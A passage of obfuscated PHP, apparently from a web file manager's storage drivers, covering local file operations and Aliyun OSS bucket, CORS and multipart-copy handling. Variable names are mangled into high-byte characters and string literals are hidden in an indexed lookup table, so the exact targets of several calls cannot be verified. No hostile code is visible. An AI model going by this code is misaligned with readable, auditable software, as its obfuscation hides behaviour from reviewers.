public function getPath($Á±Ù¡à•) { if (substr($Á±Ù¡à•, 0, 2) == $_SERVER[ùÆÎÔ“Ñ][1381]) { $Á±Ù¡à• = BASIC_PATH . substr($Á±Ù¡à•, 2); } return $Á±Ù¡à•; } public function iconvApp($Ô»ô»åï) { $éğã°ºÛ =& $_SERVER[ùÆÎÔ“Ñ]; global $config; return $this->iconvTo($Ô»ô»åï, $config[$éğã°ºÛ[1379]], $config[$éğã°ºÛ[1378]]); } public function iconvSystem($´ÈáÒ‰ ) { $•¦”îÀÓ =& $_SERVER[ùÆÎÔ“Ñ]; global $config; return $this->iconvTo($´ÈáÒ‰ , $config[$•¦”îÀÓ[1378]], $config[$•¦”îÀÓ[1379]]); } public function getPathOuter($“È­Ûş“) { $º˜“Ï¶· =& $_SERVER[ùÆÎÔ“Ñ]; $ù†õÓï” = $this->iconvApp($this->pathBase); $“È­Ûş“ = $this->iconvApp($“È­Ûş“); if (substr($ù†õÓï”, 0, 2) == $º˜“Ï¶·[1381]) { $ù†õÓï” = BASIC_PATH . substr($ù†õÓï”, 2); } if (substr($“È­Ûş“, 0, 2) == $º˜“Ï¶·[1381]) { $“È­Ûş“ = BASIC_PATH . substr($“È­Ûş“, 2); } $ù†õÓï” = KodIO::clear($ù†õÓï”); $“È­Ûş“ = KodIO::clear($“È­Ûş“); $“È­Ûş“ = substr($“È­Ûş“, strlen($ù†õÓï”)); if (empty($this->pathDriver)) { return $“È­Ûş“; } return $this->pathDriver . $º˜“Ï¶·[8] . ltrim($“È­Ûş“, $º˜“Ï¶·[8]); } public function mkfile($’óÇªğÛ, $Ëº’©Œ = '', $òš’•†¬ = REPEAT_RENAME) { $’óÇªğÛ = $this->iconvSystem($’óÇªğÛ); @touch($’óÇªğÛ); if ($Ëº’©Œ) { file_put_contents($’óÇªğÛ, $Ëº’©Œ); } @chmod($’óÇªğÛ, $this->pathAuth); return is_file($’óÇªğÛ) ? $this->getPathOuter($’óÇªğÛ) : !1; } public function mkdir($‹å¦Ÿøˆ, $ÎòÈ…‹´ = REPEAT_SKIP) { $‹å¦Ÿøˆ = $this->iconvSystem($‹å¦Ÿøˆ); if (is_dir($‹å¦Ÿøˆ)) { return $this->getPathOuter($‹å¦Ÿøˆ); } @mkdir($‹å¦Ÿøˆ, $this->pathAuth, !0); @chmod($‹å¦Ÿøˆ, $this->pathAuth); return is_dir($‹å¦Ÿøˆ) ? $this->getPathOuter($‹å¦Ÿøˆ) : !1; } public function copyFile($öíá¨ü, $´çåËõô) { $this->mkdir($this->pathFather($´çåËõô)); $öíá¨ü = $this->iconvSystem($öíá¨ü); $´çåËõô = $this->iconvSystem($´çåËõô); $–¨Ìùù’ = copy_64($öíá¨ü, $´çåËõô); @chmod($´çåËõô, $this->pathAuth); return $–¨Ìùù’ ? $this->getPathOuter($´çåËõô) : !1; } public function moveFile($¬»¢¦†Á, $ıÔª¯İ) { $this->mkdir($this->pathFather($ıÔª¯İ)); $¬»¢¦†Á = $this->iconvSystem($¬»¢¦†Á); $ıÔª¯İ = $this->iconvSystem($ıÔª¯İ); $á²†ÚÁ = intval(@rename($¬»¢¦†Á, $ıÔª¯İ)); if (!$á²†ÚÁ) { if ($á²†ÚÁ = intval(@copy_64($¬»¢¦†Á, $ıÔª¯İ))) { @unlink($¬»¢¦†Á); } } @chmod($ıÔª¯İ, $this->pathAuth); return $á²†ÚÁ ? $this->getPathOuter($ıÔª¯İ) : !1; } public function movePath($Ô¬Ã– , $ÑåÕ¨Á—, $·´å‰İœ = false) { $èÀŠöú =& $_SERVER[ùÆÎÔ“Ñ]; $Ô¬Ã–  = $this->iconvSystem($Ô¬Ã– ); $ÑåÕ¨Á— = $this->iconvSystem($ÑåÕ¨Á—); $éÏ·š•± = rtrim($ÑåÕ¨Á—, $èÀŠöú[8]) . $èÀŠöú[8] . ($·´å‰İœ ? $·´å‰İœ : get_path_this($Ô¬Ã– )); if (file_exists($éÏ·š•±)) { return !1; } $ƒŸ¾å„§ = intval(@rename($Ô¬Ã– , $éÏ·š•±)); $ƒŸ¾å„§ = file_exists($éÏ·š•±); return $ƒŸ¾å„§ ? $this->getPathOuter($éÏ·š•±) : !1; } public function delFile($½×¢çÁ½) { $½×¢çÁ½ = $this->iconvSystem($½×¢çÁ½); if (!@unlink($½×¢çÁ½)) { @chmod($½×¢çÁ½, $this->pathAuth); if (!@unlink($½×¢çÁ½)) { return !1; } } else { return !0; } } public function delFolder($µü¶«Õ¢) { $¬¡Û‡é¢ =& $_SERVER[ùÆÎÔ“Ñ]; $µü¶«Õ¢ = $this->iconvSystem($µü¶«Õ¢); if (!is_dir($µü¶«Õ¢)) { return !0; } if (!($åâû·¤ = opendir($µü¶«Õ¢))) { return !1; } while (($ÏèªƒÁ¢ = readdir($åâû·¤)) !== !1) { if ($ÏèªƒÁ¢ == $¬¡Û‡é¢[10] || $ÏèªƒÁ¢ == $¬¡Û‡é¢[1388]) { continue; } $€éëÂ¬ì = $µü¶«Õ¢ . $¬¡Û‡é¢[8] . $ÏèªƒÁ¢; if (is_file($€éëÂ¬ì) || is_link($€éëÂ¬ì)) { if (!unlink($€éëÂ¬ì)) { chmod($€éëÂ¬ì, $this->pathAuth); if (!unlink($€éëÂ¬ì)) { return !1; } } } else { if (is_dir($€éëÂ¬ì)) { chmod($€éëÂ¬ì, $this->pathAuth); $€éëÂ¬ì = $this->iconvApp($€éëÂ¬ì); if (!$this->delFolder($€éëÂ¬ì)) { return !1; } } } } closedir($åâû·¤); return rmdir($µü¶«Õ¢); } public function rename($š¯±ÄÔÕ, $èóúŠíã) { $Íòçàêï =& $_SERVER[ùÆÎÔ“Ñ]; $õĞóàƒ = $this->fileNameAuto($this->pathFather($š¯±ÄÔÕ), $èóúŠíã); $õĞóàƒ = $this->iconvSystem($õĞóàƒ); $š¯±ÄÔÕ = $this->iconvSystem($š¯±ÄÔÕ); $´í¬À¢ = $this->pathFather($š¯±ÄÔÕ); $‘à«Äœ© = rtrim($´í¬À¢, $Íòçàêï[8]) . $Íòçàêï[8] . $õĞóàƒ; $õÀÈ°é = @rename($š¯±ÄÔÕ, $‘à«Äœ©); $‘à«Äœ© = $this->iconvApp($‘à«Äœ©); return $õÀÈ°é ? $this->getPathOuter($‘à«Äœ©) : !1; } public function size($¼°Ş–…ƒ) { $¼°Ş–…ƒ = $this->iconvSystem($¼°Ş–…ƒ); return filesize_64($¼°Ş–…ƒ); } public function info($«ÎÅÒè) { $«ÎÅÒè = $this->iconvSystem($«ÎÅÒè); if ($this->isFolder($«ÎÅÒè)) { return $this->folderInfo($«ÎÅÒè); } else { if ($this->isFile($«ÎÅÒè)) { return $this->fileInfo($«ÎÅÒè); } } return !1; } protected function infoChildren($Åû±÷À‡, &$şõû¤Å³, $ˆğŞº‚ = true) { $°çìÈ ¿ =& $_SERVER[ùÆÎÔ“Ñ]; check_abort_echo(); $Åû±÷À‡ = rtrim($Åû±÷À‡, $°çìÈ ¿[8]) . $°çìÈ ¿[8]; if ($ˆğŞº‚) { $Åû±÷À‡ = $this->iconvSystem($Åû±÷À‡); } if (!($»èÈó’… = @opendir($Åû±÷À‡))) { return; } while (($°à¢Í¶£ = readdir($»èÈó’…)) !== !1) { if ($°à¢Í¶£ == $°çìÈ ¿[10] || $°à¢Í¶£ == $°çìÈ ¿[1388]) { continue; } $†­ŠÀâ¨ = $Åû±÷À‡ . $°à¢Í¶£; if (is_file($†­ŠÀâ¨) || is_link($†­ŠÀâ¨)) { $şõû¤Å³[$°çìÈ ¿[77]]++; $şõû¤Å³[$°çìÈ ¿[76]] += filesize_64($†­ŠÀâ¨); } else { if (is_dir($†­ŠÀâ¨)) { $şõû¤Å³[$°çìÈ ¿[78]]++; $this->infoChildren($†­ŠÀâ¨, $şõû¤Å³, !1); } } } closedir($»èÈó’…); } private function folderInfo($¬†ŒÖÔÅ, $–Õº±À’ = false) { $¶ÇĞ÷´Ì =& $_SERVER[ùÆÎÔ“Ñ]; $¬†ŒÖÔÅ = rtrim($¬†ŒÖÔÅ, $¶ÇĞ÷´Ì[8]) . $¶ÇĞ÷´Ì[8]; $¯Ü»Šº = $this->iconvApp($this->pathThis($¬†ŒÖÔÅ)); if ($–Õº±À’) { return array($¶ÇĞ÷´Ì[32] => $¯Ü»Šº, $¶ÇĞ÷´Ì[84] => $this->getPathOuter($¬†ŒÖÔÅ), $¶ÇĞ÷´Ì[33] => $¶ÇĞ÷´Ì[75]); } $µ÷ã¬¸ì = array($¶ÇĞ÷´Ì[32] => $¯Ü»Šº, $¶ÇĞ÷´Ì[84] => $this->getPathOuter($¬†ŒÖÔÅ), $¶ÇĞ÷´Ì[33] => $¶ÇĞ÷´Ì[75], $¶ÇĞ÷´Ì[200] => @filectime($¬†ŒÖÔÅ), $¶ÇĞ÷´Ì[85] => @filemtime($¬†ŒÖÔÅ), $¶ÇĞ÷´Ì[1391] => @fileatime($¬†ŒÖÔÅ), $¶ÇĞ÷´Ì[1392] => is_readable($¬†ŒÖÔÅ), $¶ÇĞ÷´Ì[1393] => is_writable($¬†ŒÖÔÅ), $¶ÇĞ÷´Ì[1394] => get_mode($¬†ŒÖÔÅ)); return $µ÷ã¬¸ì; } private function fileInfo($ãÄãŞª‡, $äøíÂšâ = false) { $€°õÜ—¸ =& $_SERVER[ùÆÎÔ“Ñ]; $œÖõÌõÑ = $this->iconvApp($this->pathThis($ãÄãŞª‡)); if ($äøíÂšâ) { return array($€°õÜ—¸[32] => $œÖõÌõÑ, $€°õÜ—¸[84] => $this->getPathOuter($ãÄãŞª‡), $€°õÜ—¸[33] => $€°õÜ—¸[199], $€°õÜ—¸[76] => $this->size($ãÄãŞª‡), $€°õÜ—¸[174] => $this->ext($œÖõÌõÑ)); } $¢æ²Ş¸æ = array($€°õÜ—¸[32] => $œÖõÌõÑ, $€°õÜ—¸[84] => $this->getPathOuter($ãÄãŞª‡), $€°õÜ—¸[33] => $€°õÜ—¸[199], $€°õÜ—¸[200] => @filectime($ãÄãŞª‡), $€°õÜ—¸[85] => @filemtime($ãÄãŞª‡), $€°õÜ—¸[1391] => @fileatime($ãÄãŞª‡), $€°õÜ—¸[76] => $this->size($ãÄãŞª‡), $€°õÜ—¸[174] => $this->ext($œÖõÌõÑ), $€°õÜ—¸[1392] => is_readable($ãÄãŞª‡), $€°õÜ—¸[1393] => is_writable($ãÄãŞª‡), $€°õÜ—¸[1394] => get_mode($ãÄãŞª‡)); return $¢æ²Ş¸æ; } public function exist($È…äàß¬) { $È…äàß¬ = $this->iconvSystem($È…äàß¬); return @file_exists($È…äàß¬); } public function isFile($õ÷œäóª) { $õ÷œäóª = $this->iconvSystem($õ÷œäóª); return @is_file($õ÷œäóª); } public function isFolder($·¯ÚÍ¾ã) { $·¯ÚÍ¾ã = $this->iconvSystem($·¯ÚÍ¾ã); return @is_dir($·¯ÚÍ¾ã); } public function listPath($›¿¡Àƒü, $Ò‹Ñ±ë = false) { $Æ§ƒÎÑ =& $_SERVER[ùÆÎÔ“Ñ]; $›¿¡Àƒü = $this->iconvSystem($›¿¡Àƒü); $›¿¡Àƒü = rtrim($›¿¡Àƒü, $Æ§ƒÎÑ[8]) . $Æ§ƒÎÑ[8]; $ˆÒÊÄ‘Ú = array($Æ§ƒÎÑ[82] => array(), $Æ§ƒÎÑ[83] => array()); if (!($±»Ã“­¬ = @opendir($›¿¡Àƒü))) { return $ˆÒÊÄ‘Ú; } while (($˜ã–½í¨ = readdir($±»Ã“­¬)) !== !1) { if ($˜ã–½í¨ == $Æ§ƒÎÑ[10] || $˜ã–½í¨ == $Æ§ƒÎÑ[1388]) { continue; } $İìğ´Ö½ = $›¿¡Àƒü . $˜ã–½í¨; if (is_file($İìğ´Ö½)) { $ˆÒÊÄ‘Ú[$Æ§ƒÎÑ[83]][] = $this->fileInfo($İìğ´Ö½, $Ò‹Ñ±ë); } else { $ˆÒÊÄ‘Ú[$Æ§ƒÎÑ[82]][] = $this->folderInfo($İìğ´Ö½, $Ò‹Ñ±ë); } } closedir($±»Ã“­¬); return $ˆÒÊÄ‘Ú; } public function listAll($Œ»š¨ß¸, &$±«ñ¨Ñª = array()) { $±ˆ«ßˆŸ =& $_SERVER[ùÆÎÔ“Ñ]; $Œ»š¨ß¸ = $this->iconvSystem($Œ»š¨ß¸); $Œ»š¨ß¸ = rtrim($Œ»š¨ß¸, $±ˆ«ßˆŸ[8]) . $±ˆ«ßˆŸ[8]; if (!($êÊŠ¹Ô¤ = @opendir($Œ»š¨ß¸))) { return $±«ñ¨Ñª; } while (($Æõ¯ô­Ÿ = readdir($êÊŠ¹Ô¤)) !== !1) { if ($Æõ¯ô­Ÿ == $±ˆ«ßˆŸ[10] || $Æõ¯ô­Ÿ == $±ˆ«ßˆŸ[1388]) { continue; } $ü®ÕÛî = $Œ»š¨ß¸ . $Æõ¯ô­Ÿ; if (is_dir($ü®ÕÛî) && !is_link($ü®ÕÛî)) { $±«ñ¨Ñª[] = array($±ˆ«ßˆŸ[84] => $ü®ÕÛî . $±ˆ«ßˆŸ[8], $±ˆ«ßˆŸ[75] => 1, $±ˆ«ßˆŸ[85] => @filemtime($ü®ÕÛî), $±ˆ«ßˆŸ[76] => 0); $this->listAll($ü®ÕÛî, $±«ñ¨Ñª); } else { $±«ñ¨Ñª[] = array($±ˆ«ßˆŸ[84] => $ü®ÕÛî, $±ˆ«ßˆŸ[75] => 0, $±ˆ«ßˆŸ[85] => @filemtime($ü®ÕÛî), $±ˆ«ßˆŸ[76] => $this->size($ü®ÕÛî)); } } closedir($êÊŠ¹Ô¤); return $±«ñ¨Ñª; } public function has($Š‡ÊŞÛ, $çÀëô¦ú = false, $’´êÇ‰… = true) { $òâûøòÕ =& $_SERVER[ùÆÎÔ“Ñ]; $Š‡ÊŞÛ = $this->iconvSystem($Š‡ÊŞÛ); $Š‡ÊŞÛ = rtrim($Š‡ÊŞÛ, $òâûøòÕ[8]) . $òâûøòÕ[8]; if (!($ß† æŒ· = @opendir($Š‡ÊŞÛ))) { return !1; } $ÎŒ’Ñıù = 0; $ÛÛĞ‚ºú = 0; $ªóçÑÊß = 0; while (($ëåß›å© = readdir($ß† æŒ·)) !== !1) { if ($ëåß›å© == $òâûøòÕ[10] || $ëåß›å© == $òâûøòÕ[1388]) { continue; } $‰üšƒ»ã = $Š‡ÊŞÛ . $ëåß›å©; if ($çÀëô¦ú) { $ªóçÑÊß++; if (@is_file($‰üšƒ»ã)) { $ÎŒ’Ñıù++; } else { $ÛÛĞ‚ºú++; } if ($ªóçÑÊß > 10000) { break; } continue; } if ($’´êÇ‰…) { if (@is_file($‰üšƒ»ã)) { return !0; } } else { if (@is_dir($‰üšƒ»ã . $òâûøòÕ[8])) { return !0; } } } closedir($ß† æŒ·); if ($çÀëô¦ú) { return array($òâûøòÕ[207] => $ÎŒ’Ñıù, $òâûøòÕ[208] => $ÛÛĞ‚ºú); } return !1; } public function hashSimple($ğØ¹õĞ) { $²×ÍŞÎÇ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ğØ¹õĞ) { return md5($²×ÍŞÎÇ[12]); } $ğØ¹õĞ = $this->iconvSystem($ğØ¹õĞ); $ßóóúò = $this->size($ğØ¹õĞ); $èØÛïüƒ = 200; $êç¶æ•¢ = 50; if ($ßóóúò <= $èØÛïüƒ * $êç¶æ•¢) { return $this->hashMd5($ğØ¹õĞ) . $ßóóúò; } $Ïñ¡” = $²×ÍŞÎÇ[12]; $’˜¢Üúä = intval($ßóóúò / $êç¶æ•¢); $ÁÀµÏÕ± = fopen($ğØ¹õĞ, $²×ÍŞÎÇ[1395]); if (!$ÁÀµÏÕ±) { return $Ïñ¡”; } for ($¼ğ÷¤Â = 0; $¼ğ÷¤Â < $êç¶æ•¢; $¼ğ÷¤Â++) { fseek_64($ÁÀµÏÕ±, $’˜¢Üúä * $¼ğ÷¤Â); $Ïñ¡” .= fread($ÁÀµÏÕ±, $èØÛïüƒ); } fseek_64($ÁÀµÏÕ±, $ßóóúò - $èØÛïüƒ); $Ïñ¡” .= fread($ÁÀµÏÕ±, $èØÛïüƒ); fclose($ÁÀµÏÕ±); return md5($Ïñ¡”) . $ßóóúò; } public function getContent($Ê·Ü„€) { $Ê·Ü„€ = $this->iconvSystem($Ê·Ü„€); return file_get_contents($Ê·Ü„€); } public function setContent($í‰ÉšÕ¦, $’÷€»í÷ = '') { $í‰ÉšÕ¦ = $this->iconvSystem($í‰ÉšÕ¦); $ŒŞíÛ™Å = @file_put_contents($í‰ÉšÕ¦, $’÷€»í÷, LOCK_EX); clearstatcache(); @chmod($í‰ÉšÕ¦, $this->pathAuth); return $ŒŞíÛ™Å === !1 ? !1 : !0; } public function fileSubstr($áÎ­µÇ£, $ÅŸı‹‚ = 0, $öŒ¨ä­÷ = false) { $õÒ©•Ö¼ =& $_SERVER[ùÆÎÔ“Ñ]; $áÎ­µÇ£ = $this->iconvSystem($áÎ­µÇ£); if ($öŒ¨ä­÷ === !1) { $öŒ¨ä­÷ = $this->size($áÎ­µÇ£); } if ($öŒ¨ä­÷ <= 0) { return $õÒ©•Ö¼[12]; } $Ëä™–ä‡ = fopen($áÎ­µÇ£, $õÒ©•Ö¼[1395]); if (!$Ëä™–ä‡) { return !1; } fseek_64($Ëä™–ä‡, $ÅŸı‹‚); $‘ÚŞ——† = fread($Ëä™–ä‡, $öŒ¨ä­÷); fclose($Ëä™–ä‡); return $‘ÚŞ——†; } public function upload($’ß¤ğÏ, $à üŒËÏ, $Ää–…¦Û = false, $ß£‚‚†´ = REPEAT_REPLACE) { if ($Ää–…¦Û) { return $this->moveFile($à üŒËÏ, $’ß¤ğÏ); } return $this->copyFile($à üŒËÏ, $’ß¤ğÏ); } public function setModifyTime($Ş½Ğôˆ, $È™§©Ìö = '') { @touch($Ş½Ğôˆ, intval($È™§©Ìö)); } public function download($ì’Îùğ, $éÖï»¼¼) { return $this->iconvSystem($ì’Îùğ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($©Ä¾ Ç„) { parent::__construct($©Ä¾ Ç„); $this->signatureVersion($_SERVER[ùÆÎÔ“Ñ][216]); } public function fileOutLink($ÁúÙ¯œŠ) { $¹šŸÉÇá =& $_SERVER[ùÆÎÔ“Ñ]; if (substr($ÁúÙ¯œŠ, 0, 7) == $¹šŸÉÇá[1339]) { $ÁúÙ¯œŠ = $¹šŸÉÇá[1340] . substr($ÁúÙ¯œŠ, 7); } header($¹šŸÉÇá[161] . $ÁúÙ¯œŠ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($æ‰üÙÈİ) { parent::__construct(); include_once SDK_DIR . $_SERVER[ùÆÎÔ“Ñ][1396]; $this->_init($æ‰üÙÈİ); } public function _init($çç’½÷Í) { $Ùı‡ÏÀÙ =& $_SERVER[ùÆÎÔ“Ñ]; foreach ($çç’½÷Í as $Ü¯ëü—¬ => $¿äËö‹Å) { if (isset($this->{$Ü¯ëü—¬})) { $this->{$Ü¯ëü—¬} = $¿äËö‹Å; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ùı‡ÏÀÙ[1397] . LNG($Ùı‡ÏÀÙ[1398])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $û¨‘»ª˜ =& $_SERVER[ùÆÎÔ“Ñ]; $­Ÿ‡°ì¿ = new OSS\Model\CorsConfig(); $ÒØÀÎ— = new OSS\Model\CorsRule(); $ÒØÀÎ—->addAllowedOrigin($û¨‘»ª˜[1399]); $ÒØÀÎ—->addAllowedMethod($û¨‘»ª˜[1400]); $ÒØÀÎ—->addAllowedMethod($û¨‘»ª˜[1401]); $ÒØÀÎ—->addAllowedMethod($û¨‘»ª˜[1402]); $ÒØÀÎ—->addAllowedMethod($û¨‘»ª˜[1403]); $ÒØÀÎ—->addAllowedMethod($û¨‘»ª˜[160]); $ÒØÀÎ—->setMaxAgeSeconds(600); $ÒØÀÎ—->addExposeHeader($û¨‘»ª˜[1404]); $ÒØÀÎ—->addAllowedHeader($û¨‘»ª˜[1399]); $­Ÿ‡°ì¿->addRule($ÒØÀÎ—); try { $this->client->putBucketCors($this->bucket, $­Ÿ‡°ì¿); } catch (OSS\Core\OssException $½ä¾ÛÜ÷) { return !1; } return !0; } public function getBucketCors() { $Û–Ûá€ =& $_SERVER[ùÆÎÔ“Ñ]; $Ş‹ãÓàò = null; try { $Ş‹ãÓàò = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ˆÛÃóü¿) { return null; } if (!$Ş‹ãÓàò || !($•£Ó ù = $Ş‹ãÓàò->getRules())) { return null; } $ŒÇÅøâ = $•£Ó ù[0]->getAllowedOrigins(); $òÍĞ¿ô = $•£Ó ù[0]->getAllowedMethods(); $İÍÀ¸£™ = $•£Ó ù[0]->getMaxAgeSeconds(); $óè¹… Û = $•£Ó ù[0]->getExposeHeaders(); $¬³Õé = $•£Ó ù[0]->getAllowedHeaders(); return array($Û–Ûá€[187] => isset($ŒÇÅøâ[0]) ? $ŒÇÅøâ[0] : $Û–Ûá€[12], $Û–Ûá€[191] => $òÍĞ¿ô, $Û–Ûá€[1405] => $İÍÀ¸£™, $Û–Ûá€[1406] => isset($óè¹… Û[0]) ? $óè¹… Û[0] : $Û–Ûá€[12], $Û–Ûá€[189] => isset($¬³Õé[0]) ? $¬³Õé[0] : $Û–Ûá€[12]); } public function isBucketCors() { $¡¹õ½æ£ =& $_SERVER[ùÆÎÔ“Ñ]; $Œ ¦‰Ÿ = $this->getBucketCors(); if (!$Œ ¦‰Ÿ || !is_array($Œ ¦‰Ÿ)) { return !1; } if ($Œ ¦‰Ÿ[$¡¹õ½æ£[187]] != $¡¹õ½æ£[188] || $Œ ¦‰Ÿ[$¡¹õ½æ£[189]] != $¡¹õ½æ£[188]) { return !1; } $ŞÌ¹Áº = array_map($¡¹õ½æ£[190], $Œ ¦‰Ÿ[$¡¹õ½æ£[191]]); if (!is_array($ŞÌ¹Áº)) { $ŞÌ¹Áº = array(); } $î€®øçø = array($¡¹õ½æ£[192], $¡¹õ½æ£[193], $¡¹õ½æ£[194], $¡¹õ½æ£[195], $¡¹õ½æ£[196]); $ÌŸî½¡É = array_diff($î€®øçø, $ŞÌ¹Áº); return empty($ÌŸî½¡É); } public function mkfile($£ÒŠ¡§¸, $ÚÕÃñ—Û = '', $««£ÕØÄ = REPEAT_RENAME) { $äÚÒÅ‰İ = $this->setContent($£ÒŠ¡§¸, $ÚÕÃñ—Û); if ($äÚÒÅ‰İ !== !1) { return $this->getPathOuter($£ÒŠ¡§¸); } return !1; } public function mkdir($Ù”¹İßµ, $ö›œ›èö = REPEAT_SKIP) { if ($ö›œ›èö && $this->_isFolder($Ù”¹İßµ)) { return $this->getPathOuter($Ù”¹İßµ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Ù”¹İßµ)); } catch (OSS\Core\OssException $€¬²ş ¼) { return !1; } return $this->getPathOuter($Ù”¹İßµ); } private function fileList($è—Ìò¹, $óãÙÄìõ = '', $¡’Ê¬Áº = 0) { $£ñíÉ€û =& $_SERVER[ùÆÎÔ“Ñ]; $è—Ìò¹ = trim($è—Ìò¹, $£ñíÉ€û[8]); $´Çû£¿Ü = empty($è—Ìò¹) && $è—Ìò¹ !== $£ñíÉ€û[197] ? $£ñíÉ€û[12] : $è—Ìò¹ . $£ñíÉ€û[8]; $ãÃ¢ºŠø = $£ñíÉ€û[12]; $Óõª³Š = 1000; $¨öäœÅÂ = $çüïÖœ = array(); while (!0) { check_abort(); $‹¯ÈÓœ½ = array($£ñíÉ€û[1407] => $óãÙÄìõ, $£ñíÉ€û[1408] => $´Çû£¿Ü, $£ñíÉ€û[1409] => $Óõª³Š, $£ñíÉ€û[1410] => $ãÃ¢ºŠø); try { $Ñß‚®ôË = $this->client->listObjects($this->bucket, $‹¯ÈÓœ½); } catch (OSS\Core\OssException $ğË€Í±) { break; } $ãÃ¢ºŠø = $Ñß‚®ôË->getNextMarker(); $³ßİ½ø = $Ñß‚®ôË->getObjectList(); $ğ¥­ ¬¦ = $Ñß‚®ôË->getPrefixList(); foreach ($³ßİ½ø as $ĞÂ©èŞË) { if ($ĞÂ©èŞË->getKey() == $´Çû£¿Ü) { continue; } $î¢·€ËÍ = $ĞÂ©èŞË->getKey(); $«Ä©­ß¦ = $ĞÂ©èŞË->getSize(); $šç×—’Ÿ = $ĞÂ©èŞË->getLastModified(); $Æ¹ùìû = $¡’Ê¬Áº ? array($£ñíÉ€û[32] => $î¢·€ËÍ, $£ñíÉ€û[76] => $«Ä©­ß¦, $£ñíÉ€û[203] => strtotime($šç×—’Ÿ)) : $î¢·€ËÍ; $Ñş ğ×ô = $«Ä©­ß¦ == 0 && substr($î¢·€ËÍ, strlen($î¢·€ËÍ) - 1, 1) == $£ñíÉ€û[8] ? !0 : !1; $¼¯™ÄÉ© = array($£ñíÉ€û[76] => $«Ä©­ß¦, $£ñíÉ€û[1411] => $«Ä©­ß¦, $£ñíÉ€û[85] => strtotime($šç×—’Ÿ), $£ñíÉ€û[1412] => $šç×—’Ÿ); $this->cacheMethodInfoSet($î¢·€ËÍ, $Ñş ğ×ô, $¼¯™ÄÉ©); if ($Ñş ğ×ô) { $¨öäœÅÂ[] = $î¢·€ËÍ; continue; } $çüïÖœ[] = $Æ¹ùìû; } foreach ($ğ¥­ ¬¦ as $ã°ÏÕ¼İ) { $¨öäœÅÂ[] = $ã°ÏÕ¼İ->getPrefix(); $this->cacheMethodInfoSet($ã°ÏÕ¼İ->getPrefix(), !0); } if ($ãÃ¢ºŠø === $£ñíÉ€û[12]) { break; } } $this->cacheMethodInfoSet($è—Ìò¹, !0); return array($£ñíÉ€û[82] => $¨öäœÅÂ, $£ñíÉ€û[83] => $çüïÖœ); } public function copyFile($ÍÎ£ş´¢, $ºÌ³Â ˜) { $ÜƒîÖ«ı = $this->size($ÍÎ£ş´¢); if ($ÜƒîÖ«ı < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ÍÎ£ş´¢, $this->bucket, $this->pathEncode($ºÌ³Â ˜)); } catch (OSS\Core\OssException $šÒµ±•ê) { return !1; } return $this->getPathOuter($ºÌ³Â ˜); } $à¶Ç = $this->multiCopyObject($ÍÎ£ş´¢, $ºÌ³Â ˜, $ÜƒîÖ«ı); return $à¶Ç ? $this->getPathOuter($ºÌ³Â ˜) : !1; } private function multiCopyObject($ôşáÓ´², $‹ã‹¸ ú, $úîŞõò) { $‚¯Úóô¾ =& $_SERVER[ùÆÎÔ“Ñ]; try { $“áıÇ¸ = array(); if ($ éîÏ¶¥ = $this->hashMd5($ôşáÓ´²)) { $“áıÇ¸ = array(OSS\OssClient::OSS_HEADERS => array($‚¯Úóô¾[1413] => $ éîÏ¶¥)); } $ˆ¯¢Ã¤ª = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($‹ã‹¸ ú), $“áıÇ¸); $¶‘“ø  = 1; $Ê•€€áå = 0; $âü™ÉĞ† = array(); $Ø°ø»«µ = 1024 * 1024 * 10; $±·Ó®ş = $this->client->generateMultiuploadParts($úîŞõò, $Ø°ø»«µ); foreach ($±·Ó®ş as $Îõô› => $®ÉéÕ‚§) { $ï¤ı¶¤ú = $Ê•€€áå + (int) $®ÉéÕ‚§[$‚¯Úóô¾[1414]]; $“ªêŞÓ = (int) $®ÉéÕ‚§[$‚¯Úóô¾[337]] + $ï¤ı¶¤ú - 1; $ùæÏ­ş = array($‚¯Úóô¾[1415] => $ï¤ı¶¤ú, $‚¯Úóô¾[1416] => $“ªêŞÓ); $âü™ÉĞ†[] = $this->client->uploadPartCopy($this->bucket, $ôşáÓ´², $this->bucket, $this->pathEncode($‹ã‹¸ ú), $¶‘“ø , $ˆ¯¢Ã¤ª, $ùæÏ­ş); $¶‘“ø  = $¶‘“ø  + 1; } $Íœ¡°¶ = array(); foreach ($âü™ÉĞ† as $Îõô› => $ûÀŸª¨’) { $Íœ¡°¶[] = array($‚¯Úóô¾[1417] => $Îõô› + 1, $‚¯Úóô¾[1418] => $ûÀŸª¨’); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($‹ã‹¸ ú), $ˆ¯¢Ã¤ª, $Íœ¡°¶); } catch (OSS\Core\OssException $„É—ÏÔÈ) { return !1; } return !0; } public function moveFile($òÆ¾…¨, $ÂÒÍÇ«­) { if ($this->copyFile($òÆ¾…¨, $ÂÒÍÇ«­)) { $this->remove($òÆ¾…¨); return $this->getPathOuter($ÂÒÍÇ«­); } return !1; } public function delFile($ÉÊ²‡“¾) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ÉÊ²‡“¾)); } catch (OSS\Core\OssException $È†çš¸í) { return !1; } return !0; } public function delFolder($™ª’®ÍÙ) { $¤ƒ„è±„ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->exist($™ª’®ÍÙ)) { return !0; } $this->listItemCache = !1; $ˆÎ¡”ú = $this->fileList($™ª’®ÍÙ); $this->listItemCache = !0; $ÒÇğ¡¡è = trim($™ª’®ÍÙ, $¤ƒ„è±„[8]) . $¤ƒ„è±„[8]; if (!empty($™ª’®ÍÙ) && $™ª’®ÍÙ !== $¤ƒ„è±„[197] && !in_array($ÒÇğ¡¡è, $ˆÎ¡”ú[$¤ƒ„è±„[82]])) { $ˆÎ¡”ú[$¤ƒ„è±„[82]][] = $ÒÇğ¡¡è; } $¯ÁØ€Ùí = $this->delByBatch($ˆÎ¡”ú[$¤ƒ„è±„[83]]); if (!$¯ÁØ€Ùí) { return !1; } 